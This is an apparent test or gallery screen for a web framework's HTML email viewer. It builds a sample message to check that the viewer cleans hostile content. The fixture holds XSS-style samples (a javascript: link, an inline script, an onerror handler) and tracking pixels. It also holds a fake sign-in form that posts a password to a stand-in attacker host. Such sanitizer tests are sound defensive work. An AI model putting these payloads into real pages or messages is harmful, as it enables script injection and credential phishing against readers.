<!-- Gallery screen for the html-view element (m-html-view, IronStone design-drawers-commons §12 reading pane): a designed
    HTML message with an inline cid: image, a remote image, a tracking pixel, links good and bad, a script, an onerror
    handler and a fixed banner, which the frame shows cleaned with its remote images hidden until Show images (or the
    trusted parameter, as for a trusted sender) and its reply history collapsed; and a plain-text message with its links
    and quoted reply. Nothing is sent or written. -->
<screen xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://moqui.org/xsd/xml-screen-3.xsd"
        default-menu-title="Message" default-menu-index="16">

    <parameter name="trusted"/>

    <transition name="message"><default-response url="."/></transition>

    <actions><script><![CDATA[
        // the remote image is this server's own, by its full address, so the browser test can see it load once allowed
        // (the request's host with its port: http on this machine, https elsewhere; getWebappRootUrl is the conf URL since P8-08)
        let host = ''
        try { host = ec.web ? String(ec.web.getHostName(true) || '') : '' } catch (err) { host = '' }
        let rootUrl = host ? (/^(localhost|127\.|\[::1\])/.test(host) ? 'http://' : 'https://') + host : 'https://images.example.com'
        rootUrl = rootUrl.replace(/\/$/, '')
        trustedSender = trusted === 'Y'
        cidMap = {'logo@gallery': '/images/MoquiLogoSmall.png'}
        designedBody = `<html><head><style>
                .hero { background-color: #0b5394; color: #ffffff; padding: 12px 16px; font-size: 18px; }
                .note { color: #3c4043; } .footer { color: #80868b; font-size: 12px; }
                @import url(${rootUrl}/css/never.css);
            </style></head><body>
            <div class="hero"><img src="cid:logo@gallery" alt="Logo" width="40" height="40"> <b>IronStone news</b></div>
            <p class="note">Hello Ada, here is this week's update with a picture from the sender's server:</p>
            <p><img id="remotePicture" src="${rootUrl}/MoquiLogo100.png" alt="Remote picture" width="100" height="100"></p>
            <img src="${rootUrl}/images/MoquiLogoSmall.png?opened=1" width="1" height="1">
            <p><a href="https://moqui.org/">Read more</a> or <a href="javascript:window.parent.__htmlViewRan='link'">a bad link</a>.</p>
            <script>window.parent.__htmlViewRan = 'script'</script>
            <img src="x-missing.png" alt="" onerror="window.parent.__htmlViewRan = 'onerror'">
            <form action="https://evil.example.com/steal"><input name="password"><button>Sign in</button></form>
            <p style="position:fixed;top:0;background:url(${rootUrl}/images/MoquiLogoSmall.png?tracked=1) no-repeat right center" class="footer">You get this because you asked for it.</p>
            <div class="gmail_quote">On Mon, Oct 19, 2026 at 9:00 AM Bob &lt;bob@example.com&gt; wrote:<br>
                <blockquote class="gmail_quote">The earlier message,<br>with its lines,<br>and more of them.</blockquote></div>
            </body></html>`
        plainBody = 'Hi team,\n\nThe plan is at https://moqui.org/docs, and questions go to ada@example.com.\n' +
            'Use <b>plain</b> words; nothing here is HTML.\n\n' +
            'On Sun, Oct 18, 2026 at 9:00 AM Bob <bob@example.com> wrote:\n> Where is the plan?\n>\n> Thanks, Bob\n'
    ]]></script></actions>

    <widgets>
        <container-box><box-header title="A designed message"/>
            <box-toolbar>
                <link url="message" text="Trust this sender" icon="sym_o_verified_user" condition="!trustedSender"><parameter name="trusted" value="Y"/></link>
                <link url="message" text="Hide images again" icon="sym_o_hide_image" condition="trustedSender"><parameter name="trusted" value="N"/></link>
            </box-toolbar>
            <box-body>
                <label type="p" style="m-muted" text="The HTML is cleaned in the browser and shown in a frame without scripts. Remote images wait for Show images or a trusted sender; the reply history is behind the dots."/>
                <html-view id="DesignedMessage" html="${designedBody}" allow-remote="trustedSender" cid-map="cidMap"/>
            </box-body>
        </container-box>
        <container-box><box-header title="A plain-text message"/><box-body>
            <html-view id="PlainMessage" text="${plainBody}"/>
        </box-body></container-box>
    </widgets>
</screen>
